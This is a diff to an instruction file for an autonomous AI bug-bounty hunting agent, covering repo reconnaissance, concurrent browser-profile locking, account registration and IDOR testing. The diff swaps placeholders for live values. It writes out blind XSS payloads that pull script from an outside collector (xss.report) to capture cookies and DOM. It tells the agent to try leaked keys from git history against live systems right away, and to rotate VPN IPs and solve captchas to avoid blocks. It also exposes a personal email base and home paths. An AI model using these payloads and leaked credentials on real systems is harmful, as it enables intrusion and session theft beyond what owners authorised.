@@ -156,49 +156,146 @@ The primitive is THIS infra (Caido/curl/OOB). The technique is the skill's.
 > comes from hunt-*; transport comes from here.
 
 ## Repo Recon — Spawn After Initial Feature Exploration
-Once you've explored the first few features of the app (browser walkthrough
-done, a few endpoints mapped, stack/tech fingerprinted), spawn the
-`@repo-recon` subagent on the same target before going deeper. This is not
-optional and not a final-pass step — do it early, while your own exploration
-is still warm, so its findings steer the rest of the hunt.
 
-- **Trigger**: as soon as you can name the app's stack or package (from
-  generator meta tags, `X-Powered-By` headers, JS bundle content, `/version`
-  or `CHANGELOG` pages). If the target looks like it could be open-source or
-  a known CMS/framework/app, spawn it.
-- **What to pass**: the target domain/package name and anything you've already
-  fingerprinted (version, framework, obvious vendor) as the hint.
-- **What comes back**: repo-recon returns `priority.json` with
-  `secrets_found`, `vuln_priority` (vuln class + frequency + affected dirs +
-  patch timeline), `dependency_findings`, and `open_issue_leads`.
-- **How to use it**:
-  - Attack the top-ranked `vuln_priority` classes first — they're the target's
-    historically weak spots. Read the `pattern` field and grep the live app
-    for that anti-pattern.
-  - Treat every `secrets_found` entry as an immediate lead to test in the live
-    app (leaked creds → auth test, leaked API key → endpoint access).
-  - `dependency_findings` CVEs and `open_issue_leads` can point you at exact
-    endpoints to verify — don't just log them.
-  - Note: repo-recon works on the source repo, not the live app. Its findings
-    are hypotheses to confirm against the deployed target — `bug-validator`
-    still gets the final say on anything you report.
-- If repo-recon returns nothing usable (private repo, no source), just proceed
-  with your own exploration — don't stall the loop.
+Spawning `@repo-recon` is not optional and not a final-pass step. Do it early —
+while your own exploration is still warm — so its findings steer the rest of
+the hunt. The subagent runs **in parallel** with your continued testing.
+
+### When to spawn
+
+Trigger as soon as ANY of these are true:
+- You can name the stack/package (from `X-Powered-By`, `__NEXT_DATA__`,
+  generator meta tags, JS bundle names, `/version`, `CHANGELOG`)
+- Target looks like an open-source product, CMS, or known app
+- GitHub search for the company name returns a credible match
+
+### How to spawn
+
+```
+@repo-recon
+
+TARGET: <domain or product name>
+VERSION_HINT: <anything fingerprinted — version string, framework, package name>
+OUTPUT_DIR: ~/Projects/hunts/<handle>-<YYYYMMDD>/recon/
+```
+
+### What repo-recon does (load the skill to see full detail)
+
+The subagent runs five phases:
+
+| Phase | What it does |
+|---|---|
+| **0 — Discover** | `gh search repos`, org search, live target headers, JS bundle names |
+| **1 — Clone** | Full history fetch (`--unshallow`), pin to deployed version |
+| **2 — Deleted files & forensics** | Enumerate every file ever deleted; restore & read high-value ones (creds, config, old auth); sweep dangling/orphaned commits from force-pushes |
+| **3 — Patch archaeology** | Find security commits; read the BEFORE-fix code to understand the anti-pattern; detect partial fixes (patched one file, missed siblings); grep current tree for unpatched instances |
+| **4 — Dependency audit** | osv-scanner, gitleaks, trufflehog, npm audit |
+
+### What comes back: `priority.json`
+
+```
+secrets_found          → leaked keys/tokens in git history — test immediately
+deleted_files_of_interest → recovered content of removed credential/config files
+vuln_priority          → ranked vuln classes by historical frequency
+  ↳ pattern           → exact anti-pattern to grep for in the live app
+  ↳ partial_fix: true → patched in one place; siblings likely still vulnerable
+  ↳ grep_command      → ready-to-run grep to find unpatched instances
+patch_archaeology      → per-commit: pre-fix code, what wasn't fixed, attack hint
+dependency_findings    → CVEs in pinned deps, exploitability context
+open_issue_leads       → wontfix security issues = highest-priority endpoints
+```
+
+### How to use the results
+
+- **`secrets_found`**: any entry with `verified: true` → test against the live
+  app immediately. AWS key → call `aws sts get-caller-identity`. API key →
+  hit the target's API endpoints. Don't wait.
+- **`deleted_files_of_interest`**: read every recovered file. Old auth
+  implementations reveal bypass paths. Old config files reveal infra structure.
+- **`vuln_priority` rank 1**: that's the class the target historically can't
+  stop shipping. Use `grep_command` against the live app source (jxscout
+  output) to find unpatched instances. Attack those first.
+- **`partial_fix: true`**: this commit patched ONE place. The `unpatched_siblings`
+  list tells you exactly where the same bug still lives. Go there directly.
+- **`patch_archaeology` → `attack_hint`**: read every hint. These are derived
+  from the actual pre-fix code, not guesses.
+- **`open_issue_leads` → `wontfix: true`**: maintainer explicitly declined to
+  fix. Go straight to that endpoint.
+
+All findings are hypotheses — `@bug-validator` still has the final say.
 
 ## Session Persistence
-- **Active account**: the Chrome profile currently selected in
-  `~/.agent-browser/config.json`. Switch accounts with
-  `{{HACKBOT_MISC_DIR}}/.agent-browser-profiles/switch-account.sh <name>` —
-  it rewrites the `profile` field via JSON and kills Chrome running the old
-  profile. Relaunch `agent-browser open <url>` after switching.
-- **Profile layout**: one Chrome profile per account under
-  `{{HACKBOT_MISC_DIR}}/.agent-browser-profiles/Profile-<name>`. The profile
-  IS the session — cookies/localStorage persist inside it. Every profile is
-  cloned from `Profile-Default`, so extensions + config (FoxyProxy, captcha
-  solver) are identical everywhere.
+
+### Concurrent agents — REQUIRED bootstrap (do this FIRST, before any agent-browser call)
+
+Two agents sharing a browser daemon will stomp each other's tabs: when one
+agent calls `agent-browser open <url>`, it navigates the other agent's active
+tab away. Fix: each agent must have its own daemon socket AND its own Chrome
+profile. Three env vars achieve this:
+
+| Env var | What it isolates |
+|---|---|
+| `AGENT_BROWSER_ACCOUNT` | Which account slot you own (`userA` / `userB`) |
+| `AGENT_BROWSER_PROFILE` | Chrome profile dir → separate cookies / login session |
+| `AGENT_BROWSER_NAMESPACE` | Daemon socket → **separate Chrome window entirely** |
+
+#### Self-discovery — you don't know which agent you are ahead of time
+
+Both agents load the same skill. Neither knows if it is "agent 1" or "agent 2".
+Run `claim-account.sh` at startup — it atomically races to claim the first free
+slot and tells you who you are:
+
+```bash
+ABP=~/Projects/hackbot-misc/.agent-browser-profiles
+
+# Run this ONCE at the very start of the agent session:
+eval "$(cd "$ABP" && ./claim-account.sh)"
+
+# claim-account.sh outputs three export lines, e.g.:
+#   export AGENT_BROWSER_ACCOUNT="userA"
+#   export AGENT_BROWSER_PROFILE=".../.agent-browser-profiles/Profile-userA"
+#   export AGENT_BROWSER_NAMESPACE="agent-userA"
+#
+# The other agent racing concurrently will get userB automatically.
+# After this, every `agent-browser` call in this shell is fully isolated.
+```
+
+Check your identity any time:
+```bash
+echo "I am: $AGENT_BROWSER_ACCOUNT"
+echo "My creds: ~/Projects/hunts/sessions/<target>/$AGENT_BROWSER_ACCOUNT.creds"
+```
+
+#### Release on clean exit
+```bash
+cd ~/Projects/hackbot-misc/.agent-browser-profiles && ./release-account.sh
+# frees the slot for the next agent
+```
+A missed release is not fatal — stale locks from crashed agents are
+auto-detected and cleared on the next `claim-account.sh` run.
+
+#### How the lock works
+`claim-account.sh` uses `mkdir(2)` atomicity (POSIX-guaranteed) as a lock
+primitive. It records the calling shell's PID (`$PPID`) in the lock dir. On
+the next claim, if that PID is dead, the lock is reclaimed automatically.
+No shared files are written — `~/.agent-browser/config.json` is never touched.
+
+### Single-agent / sequential use
+If only one agent is running, `switch-account.sh <name>` still works — it
+rewrites `config.json` and kills Chrome on the old profile. **Do not call it
+when two agents run concurrently** (race condition on the shared file).
+
+### Profile layout
+One Chrome profile per account under
+`~/Projects/hackbot-misc/.agent-browser-profiles/Profile-<name>`. The profile
+IS the session — cookies/localStorage persist inside it. Every profile is
+cloned from `Profile-Default`, so extensions + config (FoxyProxy, captcha
+solver) are identical everywhere.
+
 - **Reuse existing**: if `Profile-userA` exists and the account isn't dead,
-  `switch-account.sh userA` and continue — don't re-login.
-- **Create if missing**: `./clone-profile.sh userA`, `./switch-account.sh userA`,
+  `claim-account.sh` will claim it and pick up the existing cookies — no
+  re-login needed.
+- **Create if missing**: `./clone-profile.sh userA`, then run `claim-account.sh`,
   then log in once in the browser.
 - **Two sessions, always**: userA and userB. If only userA's profile exists,
   `clone-profile.sh userB` and register it.
@@ -207,9 +304,9 @@ is still warm, so its findings steer the rest of the hunt.
 - **Sync extensions**: after changing FoxyProxy rules or captcha-solver config
   in the source profile, run `sync-extensions.sh` so the change reaches every
   account profile.
-- **Creds**: durable login credentials (for re-login after cookie expiry) live
-  in `~/Projects/hunts/sessions/<domain>/userA.creds` / `userB.creds`. The
-  auth state itself lives in the Chrome profile, not a state JSON anymore.
+- **Creds**: durable login credentials live in
+  `~/Projects/hunts/sessions/<domain>/$AGENT_BROWSER_ACCOUNT.creds`.
+  The auth state itself lives in the Chrome profile, not a state JSON.
 
 ## UI Bypass via Caido Match & Replace
 Use `create_tamper_rule` / `toggle_tamper_rule` to flip UI-gating flags in
@@ -232,8 +329,8 @@ account is useless the moment the target requires email verification.
 
 Every registration email MUST follow this pattern:
 ```
-{{EMAIL_BASE}}+<target>-a@{{EMAIL_DOMAIN}}   # userA
-{{EMAIL_BASE}}+<target>-b@{{EMAIL_DOMAIN}}   # userB
+aceproulx+<target>-a@intigriti.me   # userA
+aceproulx+<target>-b@intigriti.me   # userB
 ```
 (`-` also works as the separator if `+` gets stripped by a target's input
 validation — try `+` first, fall back to `-`.) These forward into the
@@ -291,71 +388,73 @@ Extract the OTP/verification code from the message body.
   number was used on that target before. Pick a different one.
 
 ### Before registering ANY account, in this order:
-1. Check `~/Projects/hunts/sessions/<domain>/userA.creds` and `userB.creds` for an
-   existing account. If found and not dead/banned, log in with those
+1. **You must have claimed your account first** — `$AGENT_BROWSER_ACCOUNT` must
+   be set (see Session Persistence above). Check: `echo $AGENT_BROWSER_ACCOUNT`.
+2. Check `~/Projects/hunts/sessions/<domain>/$AGENT_BROWSER_ACCOUNT.creds` for
+   an existing account. If found and not dead/banned, log in with those
    credentials instead of registering a new one.
-2. If no creds file exists, ensure the account's Chrome profile exists
-   (each account = its own profile dir under
-   `{{HACKBOT_MISC_DIR}}/.agent-browser-profiles/`, all cloned from
-   `Profile-Default` so they share FoxyProxy + the captcha solver):
+3. If no creds file exists, ensure your profile exists (it should — `claim-account.sh`
+   validates this, but check anyway):
    ```bash
-   ABP={{HACKBOT_MISC_DIR}}/.agent-browser-profiles
-   [ -d "$ABP/Profile-userA" ] || (cd "$ABP" && ./clone-profile.sh userA)
-   [ -d "$ABP/Profile-userB" ] || (cd "$ABP" && ./clone-profile.sh userB)
+   ABP=~/Projects/hackbot-misc/.agent-browser-profiles
+   [ -d "$ABP/Profile-$AGENT_BROWSER_ACCOUNT" ] || \
+     (cd "$ABP" && ./clone-profile.sh "$AGENT_BROWSER_ACCOUNT")
    ```
-3. Switch the active profile to the account being registered, then register
-   fresh using the address pattern above:
+4. Your profile is already active (set by `claim-account.sh`). Just open the
+   browser — no switch needed:
    ```bash
-   (cd "$ABP" && ./switch-account.sh userA)
-   agent-browser open "$TARGET/register"   # captcha solver already active here
+   agent-browser open "$TARGET/register"   # captcha solver already active
    ```
-4. Immediately after successful registration — before doing anything
-   else — write the credentials:
+5. Immediately after successful registration — before doing anything else —
+   write the credentials:
    ```bash
-   cat > ~/Projects/hunts/sessions/${TARGET}/userA.creds <<EOF
-   email={{EMAIL_BASE}}+${TARGET}-a@{{EMAIL_DOMAIN}}
+   # Derive the email suffix: userA → "a", userB → "b"
+   SUFFIX=$(echo "$AGENT_BROWSER_ACCOUNT" | sed 's/user//')
+   cat > ~/Projects/hunts/sessions/${TARGET}/$AGENT_BROWSER_ACCOUNT.creds <<EOF
+   email=aceproulx+${TARGET}-${SUFFIX}@intigriti.me
    password=${GENERATED_PASSWORD}
    created=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    EOF
-   chmod 600 ~/Projects/hunts/sessions/${TARGET}/userA.creds
+   chmod 600 ~/Projects/hunts/sessions/${TARGET}/$AGENT_BROWSER_ACCOUNT.creds
    ```
-   Same for userB. This is not an end-of-hunt cleanup step — do it
-   immediately or a crash/pivot mid-hunt loses the account.
-5. If the target sends a verification email, check the inbox using the
+   This is not an end-of-hunt cleanup step — do it immediately or a
+   crash/pivot mid-hunt loses the account.
+6. If the target sends a verification email, check the inbox using the
    `@email-inbox-check` skill's filtered list — never poll the raw endpoint.
 
 ### Workflow (profile-based; curl still the IDOR transport)
 ```bash
-ABP={{HACKBOT_MISC_DIR}}/.agent-browser-profiles
+ABP=~/Projects/hackbot-misc/.agent-browser-profiles
 TARGET=https://example.com
 
-# 1. One Chrome profile per account — create both, clone the shared setup
-[ -d "$ABP/Profile-userA" ] || (cd "$ABP" && ./clone-profile.sh userA)
-[ -d "$ABP/Profile-userB" ] || (cd "$ABP" && ./clone-profile.sh userB)
+# 0. Bootstrap — each agent runs this ONCE at session start.
+#    Both agents run the exact same line; claim-account.sh assigns them
+#    different slots (userA / userB) automatically.
+eval "$(cd "$ABP" && ./claim-account.sh)"
+# → $AGENT_BROWSER_ACCOUNT is now set (e.g. "userA")
+# → $AGENT_BROWSER_PROFILE and $AGENT_BROWSER_NAMESPACE are set too
 
-# 2. Register userA in its own profile (browser, session persists in the dir)
-(cd "$ABP" && ./switch-account.sh userA)
+# 1. Ensure your Chrome profile exists (clone from Default if missing)
+[ -d "$ABP/Profile-$AGENT_BROWSER_ACCOUNT" ] || \
+  (cd "$ABP" && ./clone-profile.sh "$AGENT_BROWSER_ACCOUNT")
+
+# 2. Register in your profile (agent-browser already uses the right profile
+#    because AGENT_BROWSER_PROFILE is set — no switch needed)
 agent-browser open "$TARGET/register"
-# ... fill form, verify email, confirm login landed in Profile-userA
+# ... fill form, verify email, confirm login persisted in your profile dir
 
-# 3. Register userB the same way
-(cd "$ABP" && ./switch-account.sh userB)
-agent-browser open "$TARGET/register"
-
-# 4. Keep extensions/config in sync whenever FoxyProxy rules or the
-#    captcha-solver config change in the source profile:
+# 3. Keep extensions/config in sync whenever FoxyProxy or captcha-solver
+#    config changes in the source profile:
 (cd "$ABP" && ./sync-extensions.sh)
 
-# 5. IDOR cross-check — sessions live in the profile dir, not a JSON state
-#    file. Switch accounts to flip which session the browser holds, then hit
-#    the resource IDs collected as userA while running as userB.
-(cd "$ABP" && ./switch-account.sh userA)   # browser becomes userA
-agent-browser open "$TARGET/profile"       # note userA's resource IDs
-(cd "$ABP" && ./switch-account.sh userB)   # browser becomes userB
-agent-browser open "$TARGET/api/profile/<userA-id>"   # replay in userB's session
-# or replay via curl, exporting the active profile's cookies first
-# (agent-browser cookies export) → curl -sk --proxy 127.0.0.1:8080 -b cookies.txt ...
-# If userB's session returns userA's resource → IDOR confirmed
+# 4. IDOR cross-check — each agent stays in its own window; curl does the swap.
+#    Collect your own resource IDs in the browser, then hit the other account's
+#    IDs via curl with your own cookies:
+agent-browser open "$TARGET/profile"           # note your resource IDs
+# Export cookies and replay as the other user via curl:
+# curl -sk --proxy 127.0.0.1:8080 -b /tmp/my_cookies.txt \
+#   "$TARGET/api/profile/<other-user-id>"
+# If you get the other user's data → IDOR confirmed
 ```
 
 ### Workflow (curl-based token swap, captcha-less targets)
@@ -393,7 +492,7 @@ changeip off        # Disconnect VPN entirely (internet stays up)
 changeip status     # Check current IP and connection
 ```
 
-- `changeip` cycles through free WireGuard configs located in `~/Downloads/servers/`.
+- `changeip` cycles through free WireGuard configs located in `/home/aceos/Downloads/servers/`.
 - Once connected, it automatically verifies the new IP and restores internet. Resume testing immediately.
 
 ### Cookie-based fallback
@@ -417,7 +516,7 @@ If the target is mostly blind (no reflected output), use Caido Automate with
 `create_automate_session`/`get_automate_entry` or keep the probe small and
 check status/length variance — never assume a silent 200 is a pass.
 
-- **Payloads**: `{{PAYLOADS_DIR}}`
+- **Payloads**: `~/Projects/payloads/coffinxp-payloads`
 - **Path fuzzing**: `Pentester_wordlist.pay`
 - **Parameter fuzzing via Caido Automate**: `batch_send` to fuzz a single
   endpoint — replace values, vary types, add unexpected params. threads=3,
@@ -430,7 +529,7 @@ check status/length variance — never assume a silent 200 is a pass.
 Two collector setups, pick based on what's being tested.
 
 ### Blind XSS — xss.report collector
-Primary collector for blind XSS: `{{BLIND_XSS_URL}}`. Use this on any input
+Primary collector for blind XSS: `xss.report/c/aceos`. Use this on any input
 that isn't reflected back in the immediate response — support tickets,
 usernames, file names/metadata, admin-review queues, log viewers, order
 notes, email templates, user-agent/referer-logged fields, anywhere a
@@ -442,13 +541,13 @@ body, attribute, or a context that already breaks out of an existing tag):
 
 ```html
 <!-- HTML body context -->
-'"><script src={{BLIND_XSS_URL}}></script>
+'"><script src=https://xss.report/c/aceos></script>
 
 <!-- Attribute-breakout / filtered-<script> context -->
-<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'{{BLIND_XSS_URL}}\';document.body.appendChild(a)')" />
+<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/aceos\';document.body.appendChild(a)')" />
 
 <!-- Inline <script> context, no src filtering -->
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{{BLIND_XSS_URL}}");a.send();</script>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/aceos");a.send();</script>
 ```
 
 Workflow:
@@ -458,7 +557,7 @@ Workflow:
 - Log every field + payload variant used to `interesting.md` so a hit can be
   traced back to the exact injection point later.
 - xss.report is a dashboard-based collector, not email — check
-  `{{BLIND_XSS_URL}}` periodically during a long-running hunt for
+  `https://xss.report/c/aceos` periodically during a long-running hunt for
   fired payloads (source IP, cookies, DOM, screenshot). Don't poll it
   constantly; check after finishing a feature pass or when returning to the
   hunt after a break.
@@ -613,14 +712,14 @@ Step 3: Wait for solve
   remainingMs = 117 500 ms → well within window, proceed immediately
 
 Step 4: Fill form and submit (while token is still live)
-  agent-browser type "#email" "{{EMAIL_BASE}}+target-a@{{EMAIL_DOMAIN}}"
+  agent-browser type "#email" "aceproulx+target-a@intigriti.me"
   agent-browser type "#password" "P@ss9z!mX2"
   agent-browser click "#submit-btn"
   → account created
 
 Step 5: Write creds immediately
   cat > ~/Projects/hunts/sessions/target/userA.creds << EOF
-  email={{EMAIL_BASE}}+target-a@{{EMAIL_DOMAIN}}
+  email=aceproulx+target-a@intigriti.me
   password=P@ss9z!mX2
   created=2026-09-13T18:31:00Z
   EOF
@@ -683,13 +782,18 @@ it — just navigate for a fresh page.
 add a timeout back.
 - `"sessionName": "wara"` auto-saves cookies/localStorage in the daemon.
 - Window crashed but daemon lives → `agent-browser open <url>` to reconnect.
-- Daemon dead too → relaunch; session persists in the active profile dir
-  (`~/.agent-browser/config.json` → `profile`), then `agent-browser open <url>`.
-- Switch account = `switch-account.sh <name>` (in
-  `{{HACKBOT_MISC_DIR}}/.agent-browser-profiles/`); it re-points the config
-  and kills Chrome only for the old profile, so the next launch is the other
-  account. The old account's login stays in its profile dir — nothing to save
-  or load.
+- Daemon dead too → relaunch; session persists in the active profile dir,
+  then `agent-browser open <url>`.
+- **Switch account** (concurrent agents) = set env vars via `use-account.sh`:
+  ```bash
+  eval "$(cd ~/Projects/hackbot-misc/.agent-browser-profiles && ./use-account.sh userB)"
+  ```
+  This sets `AGENT_BROWSER_PROFILE` (profile dir) AND `AGENT_BROWSER_NAMESPACE`
+  (own daemon socket = own Chrome window). The old account's login stays in its
+  profile dir — nothing to save or load.
+- **Switch account** (sequential, single agent only) = `switch-account.sh <name>`
+  (in `~/Projects/hackbot-misc/.agent-browser-profiles/`); re-points `config.json`
+  and kills Chrome only for the old profile. Do not use when two agents are live.
 
 ## JXScout — JS Analysis
 Before any JS-heavy feature, check if jxscout is already running:
